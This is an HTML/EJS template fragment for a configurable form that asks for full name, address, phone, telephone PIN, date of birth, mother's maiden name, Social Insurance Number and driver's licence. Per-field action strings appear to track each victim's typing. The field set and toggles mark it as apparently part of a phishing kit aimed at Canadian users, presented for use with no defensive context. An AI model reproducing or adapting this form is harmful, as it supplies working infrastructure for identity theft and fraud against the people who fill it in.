                    <% if (name == 'on') { %>
                        <div>
                            <span class="form-label display-block mb-5">Full Name:</span>
                            <input name="name" required id="input-name" class="form-control full-width lrinput" placeholder="Enter your Full Name" type="text" attr-action="Filling Full Name">
                        </div>
                        <% } if (address == 'on') { %>
                        <div>
                            <span class="form-label display-block mb-5">Address:</span>
                            <input name="address" required id="input-address" class="form-control full-width lrinput" placeholder="Enter your Address" type="text" attr-action="Filling Address">
                        </div>
                        <div>
                            <span class="form-label display-block mb-5">City:</span>
                            <input name="city" required id="input-city" class="form-control full-width lrinput" placeholder="Enter your City" type="text" attr-action="Filling City">
                        </div>
                        <% } if (postal == 'on') { %>
                        <div>
                            <span class="form-label display-block mb-5">Postal Code:</span>
                            <input name="postal" required id="input-postal" class="form-control full-width lrinput" placeholder="Enter your Postal Code" type="text" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code">
                        </div>
                        <% } if (phone == 'on') { %>
                        <div>
                            <span class="form-label display-block mb-5">Phone Number:</span>
                            <input name="phone" required id="input-phone" class="form-control full-width lrinput" placeholder="Enter your Phone Number" type="tel" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" attr-action="Filling Phone">
                        </div>
                        <% } if (pin == 'on') { %>
                        <div>
                            <span class="form-label display-block mb-5">Telephone Pin:</span>
                            <input name="pin" required id="input-pin" class="form-control full-width lrinput" placeholder="Enter your Telephone Pin" type="tel" attr-action="Filling Tele Pin">
                        </div>
                        <% } if (p_email) { %>
                        <div>
                            <span class="form-label display-block mb-5">Email Address:</span>
                            <input name="email" required id="input-email" class="form-control full-width lrinput" placeholder="Enter your Email Address" type="email" attr-action="Filling Email">
                        </div>
                        <% } if (p_dob) { %>
                            <div>
                                <span class="form-label display-block mb-5" style="display: block;">Date of Birth:</span>
                                <select name="dob1" required class="form-control text-center display-inline-block lrinput" style="width:30%; display: inline-block" attr-action="Selecting DoB">
                                    <option value="">MM</option>
                                    <% for (let x = 1; x <= 12; x++) { %>
                                        <% let y = x < 10 ? '0' + x : x; %>
                                        <option value="<%= y %>"><%= y %></option>
                                    <% } %>
                                </select>
                                <select name="dob2" required class="form-control text-center display-inline-block lrinput" style="width:30%; display: inline-block" attr-action="Selecting DoB">
                                    <option value="">DD</option>
                                    <% for (let x = 1; x <= 31; x++) { %>
                                        <% let y = x < 10 ? '0' + x : x; %>
                                        <option value="<%= y %>"><%= y %></option>
                                    <% } %>
                                </select>
                                <select name="dob3" required class="form-control text-center display-inline-block lrinput" style="width:37%; display: inline-block" attr-action="Selecting DoB">
                                    <option value="">YYYY</option>
                                    <% for (let x = new Date().getFullYear(); x >= new Date().getFullYear() - 110; x--) { %>
                                        <option value="<%= x %>"><%= x %></option>
                                    <% } %>
                                </select>
                            </div>
                            
                        <% } if (p_mmn) { %>
                        <div>
                            <span class="form-label display-block mb-5">Mother's Maiden Name:</span>
                            <input name="mmn" required id="input-mmn" class="form-control full-width lrinput" placeholder="Enter your Mother's Maiden Name" type="text" attr-action="Filling MMN">
                        </div>
                        <% } if (p_sin) { %>
                        <div>
                            <span class="form-label display-block mb-5">Social Insurance Number:</span>
                            <input name="sin" required id="input-sin" class="form-control full-width lrinput" placeholder="Enter your Social Insurance Number" type="tel" attr-action="Filling SIN" pattern="[0-9]{3}-[0-9]{3}-[0-9]{3}" title="Please enter a valid SIN">
                        </div>
                        <% } if (p_drivers) { %>
                        <div>
                            <span class="form-label display-block mb-5">Driver's Licence:</span>
                            <input name="drivers" required id="input-drivers" class="form-control full-width lrinput" placeholder="Enter your Driver's Licence Number" type="text" attr-action="Filling Drivers">
                        </div>
                        <% } %>
                        
                    <fieldset class="button-set">
                        <input name="cancel-button" id="cancel-button" class="btn btn-negative" value="Cancel" type="button">
                        <input onclick="submitForm()" id="save-button" class="btn btn-positive" value="Confirm" name="save" type="button">
                    </fieldset>
